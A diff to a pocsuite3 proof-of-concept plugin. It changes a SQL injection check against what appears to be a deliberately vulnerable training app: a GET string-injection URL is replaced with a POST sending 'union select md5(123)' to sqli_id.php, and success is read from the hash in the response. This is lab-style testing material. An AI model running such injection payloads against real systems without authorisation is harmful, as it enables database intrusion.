@@ -1,11 +1,9 @@
-
 from pocsuite3.api import Output, POCBase, register_poc, requests, logger
 from pocsuite3.api import get_listener_ip, get_listener_port
 from pocsuite3.api import REVERSE_PAYLOAD
 from pocsuite3.lib.utils import random_str
 from requests.exceptions import ReadTimeout
 
-from urllib.parse import urljoin
  
 class DemoPOC(POCBase):
     vulID = '11001'  
@@ -29,13 +27,18 @@ class DemoPOC(POCBase):
     def _verify(self):
 #        output = Output(self)
         result = {}
-        url = urljoin(self.url,'/vul/sqli/sqli_str.php?name=1%27+union+select+1%2Cmd5%28123%29%23&submit=%E6%9F%A5%E8%AF%A2')
-        resp = requests.get(url)
+
+        payload = {
+        	'id' : "3 union select md5(123),2",
+        	'submit' : "%E6%9F%A5%E8%AF%A2"
+        }
+        target = self.url+'/vul/sqli/sqli_id.php'
+        response = requests.post(target,data=payload)
+
         try:
-            if resp and resp.status_code == 200 and "202cb962ac59075b964b07152d234b70" in resp.text:
+            if "202cb962ac59075b964b07152d234b70" in response.text:
                 result['VerifyInfo'] = {}
-                result['VerifyInfo']['URL'] = url
-                result['VerifyInfo']['Name'] = payload
+                result['VerifyInfo']['URL'] = target
         except Exception as e:
             pass
  
@@ -52,4 +55,3 @@ class DemoPOC(POCBase):
     def _attack(self):
         return self._verify()
 register_poc(DemoPOC)
-
